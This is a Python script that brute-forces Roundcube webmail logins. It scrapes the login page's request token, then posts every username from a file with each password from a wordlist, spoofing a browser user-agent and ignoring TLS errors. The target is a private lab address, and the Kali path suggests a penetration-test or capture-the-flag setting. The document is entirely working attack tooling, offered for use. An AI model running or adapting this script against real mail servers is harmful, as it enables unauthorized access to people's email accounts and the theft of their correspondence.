import argparse
import sys
import requests
import re
from multiprocessing.dummy import Pool as ThreadPool

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import subprocess

import time

settings = {
    "password" : "P@ssw0rd",
    "threads" : 10,
    "usernames" : "usernames.txt",
    "url" : "https://10.10.155.5/mail/?_task=login"
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
}


if (len(sys.argv) > 1):
    console_mode = True
    parser = argparse.ArgumentParser(description='Command line mode')
    parser.add_argument('--url', '-u', type=str,
                        help='roundcube application URL')
    parser.add_argument('--threads', '-t', type=int,
                        help='Number of Threads', default=10)
    parser.add_argument('--usernames', type=str,
                        help="username file")
    parser.add_argument('--password', '-p', type=str,
                        help='password to brute')

    args = parser.parse_args()
    if(not args.url):
        print("'--url' was omitted")
        exit(-1)
    if (not args.threads):
        print("'--threads' was omitted")
        exit(-1)
    if (not args.usernames):
        print("'--usernames' was omitted")
        exit(-1)
    if (not args.password):
        print("'--password' was omitted")
        exit(-1)

    settings["password"] = args.password
    settings["threads"] = args.threads
    settings["usernames"] = args.usernames
    settings["url"] = args.url

def parse_token(text):
    pattern = 'request_token":"(.*)"}'
    token = re.findall(pattern, text)
    return token


def brute(login, password):
    #print("inside brute")
    try:

        #time.sleep(1)
        url = settings['url']
        r = requests.get(url, verify=False)
        cookies = r.cookies
        token = parse_token(r.text)
        r = requests.post(url + '?_task=login',
                         data={"_token": token, "_task": "login", "_action": "login", "_timezone": "Europe/Moscow",
                               "_url": "", "_user": login, "_pass": password}, headers=headers, cookies=cookies,
                         allow_redirects=False, verify=False)
    
        print("For %s:    %s:    %s:    %s" % (login, password, r.status_code, token))
    
     
    except Exception as ex:
        print(ex)

def verify():
    try:
        url = settings['url']
        r = requests.get(url, timeout=1, verify=False)
        token = parse_token(r.text)
        if(token == ""):
            return False
        return True
    except Exception as ex:
        print(ex)
        return False

if __name__ == "__main__":
    usernames = open("usernames.txt").read().split('\n')
    passwords = open("/home/kali/Downloads/fastlist.txt").read().split('\n')

    print("%d usernames loaded" % (len(usernames)))
    print("%d passwords loaded" % (len(passwords)))
    

    # if(not verify()):
    #     sys.exit()
    # pool = ThreadPool(settings['threads'])
    # results = pool.map(brute, usernames)
    # pool.close()
    # pool.join()

    for p in passwords:
        print("Trying with password: " , p)
        print("-----------------------------------------------------")
        for i in usernames:
            brute(i, p.strip())

    print("-----------------------------------------------------")
    print("The End")
